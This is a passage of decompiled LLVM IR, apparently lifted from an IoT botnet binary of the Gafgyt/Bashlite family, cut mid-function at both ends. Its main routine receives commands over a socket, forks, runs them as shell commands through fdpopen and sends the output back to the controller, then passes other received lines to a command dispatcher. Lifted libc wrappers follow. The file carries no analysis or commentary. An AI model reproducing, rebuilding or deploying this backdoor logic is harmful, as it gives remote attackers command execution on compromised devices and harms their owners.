  %v2_804df29 = load i8, i8* %storemerge17, align 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804df2c = icmp eq i8 %v2_804df29, 0
  %v1_804df2e = icmp eq i1 %v4_804df2c, false
  br i1 %v1_804df2e, label %dec_label_pc_804df0b, label %dec_label_pc_804df30

dec_label_pc_804df30:                             ; preds = %dec_label_pc_804df0b, %dec_label_pc_804defa
  %v22_804df00 = inttoptr i32 %v5_804df00 to i8*
  store i32 %v1_804de5c, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_8053022.87 to i32), i32* @edi, align 4
  %v7_804df60 = call i32 @_strncmp(i8* %v5_804de5f, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8053022.87, i32 0, i32 0), i32 3)
  %v8_804df60 = urem i32 %v7_804df60, 2
  %v9_804df60 = icmp eq i32 %v8_804df60, 0
  %v0_804df62 = load i1, i1* %cf.global-to-local, align 1
  %v2_804df62 = or i1 %v0_804df62, %v9_804df60
  %v3_804df62 = zext i1 %v2_804df62 to i32
  %v4_804df62 = load i32, i32* @edx, align 4
  %v5_804df62 = and i32 %v4_804df62, -256
  %v6_804df62 = or i32 %v3_804df62, %v5_804df62
  %v7_804df62 = xor i32 %v6_804df62, 1
  store i32 %v7_804df62, i32* @edx, align 4
  %v3_804df68 = and i32 %v7_804df60, -256
  %v1_804df6a = trunc i32 %v7_804df62 to i8
  %v3_804df6a = zext i1 %v0_804df62 to i8
  %v4_804df6a = sub nsw i8 %v1_804df6a, %v3_804df6a
  %v15_804df6a = icmp eq i8 %v4_804df6a, 0
  %v20_804df6a = zext i8 %v4_804df6a to i32
  %v23_804df6a = or i32 %v20_804df6a, %v3_804df68
  store i32 %v23_804df6a, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804df73 = icmp eq i1 %v15_804df6a, false
  br i1 %v1_804df73, label %dec_label_pc_804e074, label %dec_label_pc_804df79

dec_label_pc_804df79:                             ; preds = %dec_label_pc_804df30
  %v0_804df79 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804df7e = icmp eq i32 %v0_804df79, 0
  %v1_804df80 = icmp eq i1 %v1_804df7e, false
  br i1 %v1_804df80, label %dec_label_pc_804e181, label %dec_label_pc_804df86

dec_label_pc_804df86:                             ; preds = %dec_label_pc_804df79
  store i32 %v2_804df86, i32* %edx.global-to-local, align 4
  store i8* %tmp115, i8** %stack_var_-5424, align 4
  %v7_804dfa2 = call i32 @__GI_memset(i8* %tmp115, i32 0, i32 1024)
  store i32 ptrtoint ([8 x i8]* @global_var_8053025.88 to i32), i32* %edx.global-to-local, align 4
  store i8* %tmp115, i8** %stack_var_-5424, align 4
  %v6_804dfc0 = call i32 @szprintf(i32 %v2_804df86, i32 ptrtoint ([8 x i8]* @global_var_8053025.88 to i32), i32 %v5_804df00)
  store i8* %tmp115, i8** %stack_var_-5424, align 4
  %v5_804dfd7 = call i32 @fdpopen(i32 %v2_804df86, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_805302d.89, i32 0, i32 0))
  store i8* %tmp115, i8** %stack_var_-5424, align 4
  %v6_804e054157 = call i32 @fdgets(i32 %v2_804df86, i32 1024, i32 %v5_804dfd7)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e059158 = icmp eq i32 %v6_804e054157, 0
  %v1_804e05b160 = icmp eq i1 %v1_804e059158, false
  br i1 %v1_804e05b160, label %dec_label_pc_804dfe1, label %dec_label_pc_804e05d

dec_label_pc_804dfe1:                             ; preds = %dec_label_pc_804df86, %dec_label_pc_804dfe1
  store i8* %tmp115, i8** %stack_var_-5424, align 4
  %v3_804dfea = call i32 @trim(i8* %tmp115)
  %v0_804dfef = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804dfef = ptrtoint i8* %v0_804dfef to i32
  store i32 %v1_804dfef, i32* %edx.global-to-local, align 4
  store i8* %v0_804dfef, i8** %stack_var_-5424, align 4
  %v4_804e00a = call i32 @sockprintf(i32 %v1_804dfef, i32 ptrtoint ([3 x i8]* @global_var_805302f.90 to i32))
  store i32 %v2_804df86, i32* %edx.global-to-local, align 4
  store i8* %tmp115, i8** %stack_var_-5424, align 4
  %v7_804e02b = call i32 @__GI_memset(i8* %tmp115, i32 0, i32 1024)
  store i8* inttoptr (i32 1 to i8*), i8** %stack_var_-5424, align 4
  %v2_804e037 = call i32 @sleep(i32 1)
  store i8* %tmp115, i8** %stack_var_-5424, align 4
  %v6_804e054 = call i32 @fdgets(i32 %v2_804df86, i32 1024, i32 %v5_804dfd7)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804e059 = icmp eq i32 %v6_804e054, 0
  %v1_804e05b = icmp eq i1 %v1_804e059, false
  br i1 %v1_804e05b, label %dec_label_pc_804dfe1, label %dec_label_pc_804e05d

dec_label_pc_804e05d:                             ; preds = %dec_label_pc_804dfe1, %dec_label_pc_804df86
  %v4_804e060 = inttoptr i32 %v5_804dfd7 to i8*
  store i8* %v4_804e060, i8** %stack_var_-5424, align 4
  %v2_804e063 = call i32 @fdpclose(i32 %v5_804dfd7)
  store i32 %v2_804e063, i32* @eax, align 4
  store i8* null, i8** %stack_var_-5424, align 4
  %v2_804e06f = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804e074

dec_label_pc_804e074:                             ; preds = %dec_label_pc_804df30, %dec_label_pc_804e05d
  store i32 %v5_804df00, i32* @eax, align 4
  store i8* %v22_804df00, i8** %stack_var_-5424, align 4
  %v4_804e089 = call i32 @__GI_strtok(i32 %v5_804df00, i32 ptrtoint (i32* @global_var_8053032.91 to i32))
  %v5_804e08e = inttoptr i32 %v4_804e089 to i8*
  store i8* %v5_804e08e, i8** %stack_var_-36, align 4
  store i32 %v1_804de5c, i32* %stack_var_-132, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804e13526 = icmp eq i32 %v4_804e089, 0
  %v1_804e13933 = icmp eq i1 %v5_804e13526, false
  br i1 %v1_804e13933, label %dec_label_pc_804e09c, label %dec_label_pc_804e13f

dec_label_pc_804e09c:                             ; preds = %dec_label_pc_804e074, %dec_label_pc_804e11e
  %v3_804e0a9 = phi i8* [ %tmp117, %dec_label_pc_804e11e ], [ %v5_804e08e, %dec_label_pc_804e074 ]
  %stack_var_-40.134 = phi i32 [ %stack_var_-40.0, %dec_label_pc_804e11e ], [ 1, %dec_label_pc_804e074 ]
  %v2_804e09f = load i8, i8* %v3_804e0a9, align 1
  %v3_804e09f = zext i8 %v2_804e09f to i32
  store i32 %v3_804e09f, i32* @eax, align 4
  %v6_804e0a2 = icmp ult i8 %v2_804e09f, 10
  store i1 %v6_804e0a2, i1* %cf.global-to-local, align 1
  %v10_804e0a2 = icmp eq i8 %v2_804e09f, 10
  br i1 %v10_804e0a2, label %dec_label_pc_804e11e, label %dec_label_pc_804e0a6

dec_label_pc_804e0a6:                             ; preds = %dec_label_pc_804e09c
  %v4_804e09c = ptrtoint i8* %v3_804e0a9 to i32
  store i32 %stack_var_-40.134, i32* @ebx, align 4
  store i32 %v4_804e09c, i32* @edi, align 4
  %v3_804e0c0 = call i32 @_strlen(i8* %v3_804e0a9)
  %v1_804e0c4 = add i32 %v3_804e0c0, 1
  %v4_804e0c8 = inttoptr i32 %v1_804e0c4 to i8*
  store i8* %v4_804e0c8, i8** %stack_var_-5424, align 4
  %v2_804e0cb = call i32 @malloc(i32 %v1_804e0c4)
  %v1_804e0d0 = load i32, i32* @ebp, align 4
  %v2_804e0d0 = load i32, i32* @ebx, align 4
  %v3_804e0d0 = mul i32 %v2_804e0d0, 4
  %v4_804e0d0 = add i32 %v1_804e0d0, -124
  %v5_804e0d0 = add i32 %v4_804e0d0, %v3_804e0d0
  %v6_804e0d0 = inttoptr i32 %v5_804e0d0 to i32*
  store i32 %v2_804e0cb, i32* %v6_804e0d0, align 4
  %v3_804e0d4 = load i8*, i8** %stack_var_-36, align 4
  %v4_804e0d4 = ptrtoint i8* %v3_804e0d4 to i32
  %v3_804e0eb = call i32 @_strlen(i8* %v3_804e0d4)
  %v1_804e0ef = add i32 %v3_804e0eb, 1
  store i32 %v1_804e0ef, i32* %edx.global-to-local, align 4
  %v0_804e0f8 = load i32, i32* @ebp, align 4
  %v2_804e0f8 = mul i32 %stack_var_-40.134, 4
  %v3_804e0f8 = add i32 %v2_804e0f8, -124
  %v4_804e0f8 = add i32 %v0_804e0f8, %v3_804e0f8
  %v5_804e0f8 = inttoptr i32 %v4_804e0f8 to i32*
  %v6_804e0f8 = load i32, i32* %v5_804e0f8, align 4
  %v1_804e0fc = inttoptr i32 %v6_804e0f8 to i8*
  store i32 %v6_804e0f8, i32* @edi, align 4
  %v1_804e101 = and i32 %v6_804e0f8, -256
  %v5_804e103 = call i8* @_memset(i8* %v1_804e0fc, i32 %v1_804e101, i32 %v1_804e0ef)
  %v6_804e103 = ptrtoint i8* %v5_804e103 to i32
  store i32 %v6_804e103, i32* @ecx, align 4
  store i32 %v4_804e0d4, i32* %edx.global-to-local, align 4
  %v0_804e10b = load i32, i32* @ebp, align 4
  %v4_804e10b = add i32 %v0_804e10b, %v3_804e0f8
  %v5_804e10b = inttoptr i32 %v4_804e10b to i32*
  %v6_804e10b = load i32, i32* %v5_804e10b, align 4
  store i32 %v6_804e10b, i32* @eax, align 4
  %v4_804e113 = inttoptr i32 %v6_804e10b to i8*
  store i8* %v4_804e113, i8** %stack_var_-5424, align 4
  %v5_804e116 = call i32 @strcpy(i8* %v4_804e113, i32 %v4_804e0d4)
  store i32 %v5_804e116, i32* @eax, align 4
  %v4_804e11b = add i32 %stack_var_-40.134, 1
  br label %dec_label_pc_804e11e

dec_label_pc_804e11e:                             ; preds = %dec_label_pc_804e09c, %dec_label_pc_804e0a6
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.134, %dec_label_pc_804e09c ], [ %v4_804e11b, %dec_label_pc_804e0a6 ]
  store i8* null, i8** %stack_var_-5424, align 4
  %v4_804e12d = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8053032.91 to i32))
  store i32 %v4_804e12d, i32* %tmp114, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804e135 = icmp eq i32 %v4_804e12d, 0
  %v1_804e139 = icmp eq i1 %v5_804e135, false
  %tmp117 = inttoptr i32 %v4_804e12d to i8*
  br i1 %v1_804e139, label %dec_label_pc_804e09c, label %dec_label_pc_804e13f

dec_label_pc_804e13f:                             ; preds = %dec_label_pc_804e11e, %dec_label_pc_804e074
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_804e074 ], [ %stack_var_-40.0, %dec_label_pc_804e11e ]
  %v4_804e149 = inttoptr i32 %stack_var_-40.1.lcssa to i8*
  store i8* %v4_804e149, i8** %stack_var_-5424, align 4
  %v5_804e14c = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-132)
  %v9_804e151 = icmp eq i32 %stack_var_-40.1.lcssa, 0
  store i1 %v9_804e151, i1* %cf.global-to-local, align 1
  %v7_804e155 = icmp sgt i32 %stack_var_-40.1.lcssa, 1
  br i1 %v7_804e155, label %dec_label_pc_804e167.lr.ph, label %dec_label_pc_804e181

dec_label_pc_804e167.lr.ph:                       ; preds = %dec_label_pc_804e13f
  store i1 true, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804e167

dec_label_pc_804e167:                             ; preds = %dec_label_pc_804e167.lr.ph, %dec_label_pc_804e167
  %storemerge170 = phi i32 [ 1, %dec_label_pc_804e167.lr.ph ], [ %v4_804e176, %dec_label_pc_804e167 ]
  %v0_804e16a = load i32, i32* @ebp, align 4
  %v2_804e16a = mul i32 %storemerge170, 4
  %v3_804e16a = add i32 %v2_804e16a, -124
  %v4_804e16a = add i32 %v3_804e16a, %v0_804e16a
  %v5_804e16a = inttoptr i32 %v4_804e16a to i32*
  %v6_804e16a = load i32, i32* %v5_804e16a, align 4
  %v4_804e16e = inttoptr i32 %v6_804e16a to i8*
  store i8* %v4_804e16e, i8** %stack_var_-5424, align 4
  %v2_804e171 = call i32 @free(i32 %v6_804e16a)
  %v4_804e176 = add nuw i32 %storemerge170, 1
  %v10_804e17c = icmp ult i32 %v4_804e176, %stack_var_-40.1.lcssa
  store i1 %v10_804e17c, i1* %cf.global-to-local, align 1
  %exitcond = icmp eq i32 %v4_804e176, %stack_var_-40.1.lcssa
  br i1 %exitcond, label %dec_label_pc_804e181, label %dec_label_pc_804e167

dec_label_pc_804e181:                             ; preds = %dec_label_pc_804e167, %dec_label_pc_804e13f, %dec_label_pc_804df79, %dec_label_pc_804de20, %dec_label_pc_804dde9, %dec_label_pc_804dda1, %dec_label_pc_804d94d
  %v0_804e187 = load i8*, i8** @global_var_8055900.26, align 4
  %v1_804e187 = ptrtoint i8* %v0_804e187 to i32
  store i32 %v1_804e187, i32* %edx.global-to-local, align 4
  store i8* %v0_804e187, i8** %stack_var_-5424, align 4
  %v7_804e19c = call i32 @recvLine(i32 %v1_804e187, i8* %tmp113, i32 4096)
  %v8_804e1a4 = icmp ne i32 %v7_804e19c, -1
  store i1 %v8_804e1a4, i1* %cf.global-to-local, align 1
  %v13_804e1a4 = icmp eq i32 %v7_804e19c, -1
  %v1_804e1a8 = icmp eq i1 %v13_804e1a4, false
  br i1 %v1_804e1a8, label %dec_label_pc_804db4a, label %dec_label_pc_804d91a

dec_label_pc_804e1b3:                             ; preds = %dec_label_pc_804dc83, %dec_label_pc_804dd14, %dec_label_pc_804dd50, %dec_label_pc_804dc19
  %v0_804e1c1 = phi i32 [ %v0_804dd14, %dec_label_pc_804dd14 ], [ %v1_804dd21, %dec_label_pc_804dd50 ], [ %v4_804dc29, %dec_label_pc_804dc19 ], [ 0, %dec_label_pc_804dc83 ]
  %v0_804e1b3 = load i32, i32* @esp, align 4
  %v5_804e1b3 = icmp ugt i32 %v0_804e1b3, -5401
  store i1 %v5_804e1b3, i1* %cf.global-to-local, align 1
  ret i32 %v0_804e1c1

; uselistorder directives
  uselistorder i32 %v7_804e19c, { 0, 2, 1 }
  uselistorder i32 %v4_804e176, { 1, 0, 2 }
  uselistorder i32 %storemerge170, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v1_804e0ef, { 1, 0 }
  uselistorder i32 %v1_804e0c4, { 1, 0 }
  uselistorder i32 %stack_var_-40.134, { 0, 3, 2, 1 }
  uselistorder i8* %v3_804e0a9, { 2, 1, 0 }
  uselistorder i32 %v5_804dfd7, { 2, 1, 3, 0 }
  uselistorder i1 %v0_804df62, { 1, 0 }
  uselistorder i32 %v7_804df60, { 1, 0 }
  uselistorder i8* %storemerge17, { 1, 0 }
  uselistorder i32 %v5_804df23, { 1, 0 }
  uselistorder i32 %v2_804df17, { 1, 0 }
  uselistorder i8* %storemerge17156, { 1, 0 }
  uselistorder i32 %v6_804ded0, { 1, 0 }
  uselistorder i32 %v6_804dea7, { 1, 0 }
  uselistorder i32 %v6_804de82, { 1, 0 }
  uselistorder i8* %v5_804de5f, { 5, 0, 3, 1, 2, 4, 6, 8, 7 }
  uselistorder i32 %v1_804de5c, { 4, 5, 0, 1, 2, 6, 7, 3, 8 }
  uselistorder i32 %v6_804de59, { 1, 0 }
  uselistorder i8* %storemerge18.lcssa, { 1, 0 }
  uselistorder i1 %v0_804dd01, { 1, 0 }
  uselistorder i32 %v3_804dcca, { 1, 0 }
  uselistorder i1 %v0_804dc70, { 1, 0 }
  uselistorder i32 %v3_804dc39, { 1, 0 }
  uselistorder i1 %v0_804dbf7, { 1, 0 }
  uselistorder i32 %v0_804db5a, { 1, 0, 2 }
  uselistorder i32 %storemerge19, { 2, 4, 0, 3, 1 }
  uselistorder i32 %v0_804daf0, { 1, 0, 2 }
  uselistorder i32 %storemerge20, { 1, 0, 2 }
  uselistorder i32 %v2_804dabd, { 2, 0, 1 }
  uselistorder i32 %v2_804daa9, { 1, 0 }
  uselistorder i32 %v2_804daa0, { 1, 0 }
  uselistorder i32 %v0_804da75, { 1, 0 }
  uselistorder i32 %v0_804da1a, { 1, 0, 2 }
  uselistorder i32 %storemerge21, { 1, 2, 0, 3 }
  uselistorder i32 %v2_804d9a4, { 1, 0 }
  uselistorder i8* %tmp115, { 5, 2, 1, 4, 3, 0, 6, 7, 8, 9 }
  uselistorder i32 %v2_804df86, { 2, 1, 0, 3, 4, 5 }
  uselistorder i8* %v5_804de38, { 3, 0, 1, 2 }
  uselistorder i8* %tmp113, { 5, 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_804e181, { 2, 0, 5, 4, 6, 1, 7, 8, 3 }
  uselistorder i32 %v2_804d89f, { 1, 0, 2 }
  uselistorder i32 %storemerge22, { 2, 3, 0, 1 }
  uselistorder i32 %v3_804d831, { 1, 0 }
  uselistorder i32 %v2_804d80f, { 1, 3, 0, 2 }
  uselistorder i32 %v3_804d7db, { 1, 0 }
  uselistorder i32 %v2_804d760, { 0, 2, 1, 3 }
  uselistorder i8** %stack_var_-5424, { 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 0, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 49, 8, 7, 48, 6, 5, 4, 3, 2, 1 }
  uselistorder i8** %stack_var_-36, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 18, 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 17, 12, 11, 13, 15, 14, 16, 19, 20, 21, 22 }
  uselistorder i1* %cf.global-to-local, { 0, 43, 1, 60, 2, 4, 3, 5, 6, 59, 7, 8, 57, 9, 58, 10, 11, 56, 12, 13, 15, 16, 14, 17, 18, 19, 20, 55, 21, 22, 23, 24, 25, 26, 27, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 42, 28, 39, 40, 41, 44, 45, 46, 54, 47, 50, 48, 49, 51, 52, 53 }
  uselistorder i32 (i8*, i32)* @strcpy, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 7, 0, 6, 1, 5, 2, 4, 3 }
  uselistorder i32 ()* @listFork, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i8 13, { 0, 3, 1, 2 }
  uselistorder i32 (i32, i8*)* @strstr, { 1, 2, 3, 0, 4, 5, 6, 7, 8 }
  uselistorder [28 x i8]* @global_var_8052fec.83, { 1, 0 }
  uselistorder i32 1073741824, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32)* @sockprintf, { 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_8055900.26, { 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @sleep, { 1, 0 }
  uselistorder i32* @global_var_8052f82.74, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @__libc_fork, { 3, 2, 1, 0 }
  uselistorder i32 (i8*, ...)* @printf, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_8052f45.71 to i8*), { 1, 0 }
  uselistorder i32 ()* @getBuild, { 1, 0 }
  uselistorder i32 ()* @getEndianness, { 1, 0 }
  uselistorder i32 ()* @getCoresAmount, { 1, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 8, 9, 10, 11, 21, 22, 14, 15, 16, 17, 18, 19, 20, 0, 1, 2, 12, 13, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_804e1b3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804e167, { 1, 0 }
  uselistorder label %dec_label_pc_804e11e, { 1, 0 }
  uselistorder label %dec_label_pc_804e09c, { 1, 0 }
  uselistorder label %dec_label_pc_804e074, { 1, 0 }
  uselistorder label %dec_label_pc_804dfe1, { 1, 0 }
  uselistorder label %dec_label_pc_804df0b, { 1, 0 }
  uselistorder label %dec_label_pc_804defa, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804def0, { 1, 0 }
  uselistorder label %dec_label_pc_804de89, { 1, 0 }
  uselistorder label %dec_label_pc_804de20, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804de16, { 1, 0 }
  uselistorder label %dec_label_pc_804dde9, { 1, 0 }
  uselistorder label %dec_label_pc_804dcc4, { 1, 0 }
  uselistorder label %dec_label_pc_804db47, { 1, 0 }
  uselistorder label %dec_label_pc_804dadc, { 1, 0 }
  uselistorder label %dec_label_pc_804daba, { 1, 0 }
  uselistorder label %dec_label_pc_804da06, { 1, 0 }
  uselistorder label %dec_label_pc_804d9dc, { 1, 0 }
  uselistorder label %dec_label_pc_804d91a, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d8f3, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d857, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_804e1ca = call i32 @vfork()
  %v5_804e1cd = icmp ult i32 %v0_804e1ca, -4095
  %v1_804e1d2 = icmp eq i1 %v5_804e1cd, false
  call void @__pseudo_cond_branch(i1 %v1_804e1d2, i32 134551040)
  ret i32 %v0_804e1ca
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804e1dc = load i32, i32* @edi, align 4
  %v0_804e1dd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804e1f5 = add i32 %arg2, -12
  %v6_804e1fb = icmp ugt i32 %v1_804e1f5, 2
  br i1 %v6_804e1fb, label %dec_label_pc_804e20b, label %dec_label_pc_804e1fd

dec_label_pc_804e1fd:                             ; preds = %entry
  %v4_804e201 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804e1f5)
  br label %dec_label_pc_804e22d

dec_label_pc_804e20b:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804e213 = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804e213, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804e213, -4095
  br i1 %tmp, label %dec_label_pc_804e22b, label %dec_label_pc_804e21f

dec_label_pc_804e21f:                             ; preds = %dec_label_pc_804e20b
  %v1_804e21f = call i32 @__errno_location(i32 %v0_804e1dd)
  %v0_804e224 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e224 = sub i32 0, %v0_804e224
  %v2_804e226 = inttoptr i32 %v1_804e21f to i32*
  store i32 %v1_804e224, i32* %v2_804e226, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804e22b

dec_label_pc_804e22b:                             ; preds = %dec_label_pc_804e20b, %dec_label_pc_804e21f
  %v0_804e22b = phi i32 [ %v2_804e213, %dec_label_pc_804e20b ], [ -1, %dec_label_pc_804e21f ]
  br label %dec_label_pc_804e22d

dec_label_pc_804e22d:                             ; preds = %dec_label_pc_804e1fd, %dec_label_pc_804e22b
  %v0_804e232 = phi i32 [ %v4_804e201, %dec_label_pc_804e1fd ], [ %v0_804e22b, %dec_label_pc_804e22b ]
  store i32 %v0_804e1dd, i32* @ebx, align 4
  store i32 %v0_804e1dc, i32* @edi, align 4
  ret i32 %v0_804e232

; uselistorder directives
  uselistorder i32 %v2_804e213, { 1, 0, 2 }
  uselistorder i32 %v0_804e1dd, { 1, 0 }
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804e22d, { 1, 0 }
  uselistorder label %dec_label_pc_804e22b, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e234 = load i32, i32* @edi, align 4
  store i32 %v0_804e234, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e24c = load i32, i32* @ebx, align 4
  %v1_804e254 = call i32 @int80_syscall(i32 221)
  store i32 %v1_804e254, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804e254, -4095
  br i1 %tmp, label %dec_label_pc_804e26c, label %dec_label_pc_804e260

dec_label_pc_804e260:                             ; preds = %entry
  %v1_804e260 = call i32 @__errno_location(i32 %v0_804e24c)
  %v0_804e265 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e265 = sub i32 0, %v0_804e265
  %v2_804e267 = inttoptr i32 %v1_804e260 to i32*
  store i32 %v1_804e265, i32* %v2_804e267, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e26c

dec_label_pc_804e26c:                             ; preds = %entry, %dec_label_pc_804e260
  %v0_804e26f = phi i32 [ %v1_804e254, %entry ], [ -1, %dec_label_pc_804e260 ]
  %v2_804e271 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e271, i32* %edi.global-to-local, align 4
  ret i32 %v0_804e26f

; uselistorder directives
  uselistorder i32 %v1_804e254, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804e26c, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e29c = load i32, i32* @edi, align 4
  store i32 %v0_804e29c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804e2a4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804e2ac = call i32 @chdir(i32 %v0_804e2a4)
  store i32 %v0_804e2a4, i32* @ebx, align 4
  store i32 %v1_804e2ac, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804e2ac, -4095
  br i1 %tmp, label %dec_label_pc_804e2c4, label %dec_label_pc_804e2b8

dec_label_pc_804e2b8:                             ; preds = %entry
  %v1_804e2b8 = call i32 @__errno_location(i32 %v0_804e2a4)
  %v0_804e2bd = load i32, i32* %edi.global-to-local, align 4
  %v1_804e2bd = sub i32 0, %v0_804e2bd
  %v2_804e2bf = inttoptr i32 %v1_804e2b8 to i32*
  store i32 %v1_804e2bd, i32* %v2_804e2bf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e2c4

dec_label_pc_804e2c4:                             ; preds = %entry, %dec_label_pc_804e2b8
  %v0_804e2c5 = phi i32 [ %v1_804e2ac, %entry ], [ -1, %dec_label_pc_804e2b8 ]
  %v2_804e2c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804e2c4, i32* @edx, align 4
  %v2_804e2c8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e2c8, i32* @edi, align 4
  ret i32 %v0_804e2c5

; uselistorder directives
  uselistorder i32 %v1_804e2ac, { 1, 0, 2 }
  uselistorder i32 %v0_804e2a4, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e2c4, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804e2cc = load i32, i32* @edi, align 4
  store i32 %v0_804e2cc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804e2d4 = load i32, i32* @ebx, align 4
  %v1_804e2dc = call i32 @close(i32 %arg1)
  store i32 %v0_804e2d4, i32* @ebx, align 4
  store i32 %v1_804e2dc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804e2dc, -4095
  br i1 %tmp, label %dec_label_pc_804e2f4, label %dec_label_pc_804e2e8

dec_label_pc_804e2e8:                             ; preds = %entry
  %v1_804e2e8 = call i32 @__errno_location(i32 %v0_804e2d4)
  %v0_804e2ed = load i32, i32* %edi.global-to-local, align 4
  %v1_804e2ed = sub i32 0, %v0_804e2ed
  %v2_804e2ef = inttoptr i32 %v1_804e2e8 to i32*
  store i32 %v1_804e2ed, i32* %v2_804e2ef, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804e2f4

dec_label_pc_804e2f4:                             ; preds = %entry, %dec_label_pc_804e2e8
  %v0_804e2f5 = phi i32 [ %v1_804e2dc, %entry ], [ -1, %dec_label_pc_804e2e8 ]
  %v2_804e2f8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804e2f8, i32* @edi, align 4
  ret i32 %v0_804e2f5

; uselistorder directives
  uselistorder i32 %v1_804e2dc, { 1, 0, 2 }
  uselistorder i32 %v0_804e2d4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804e2f4, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
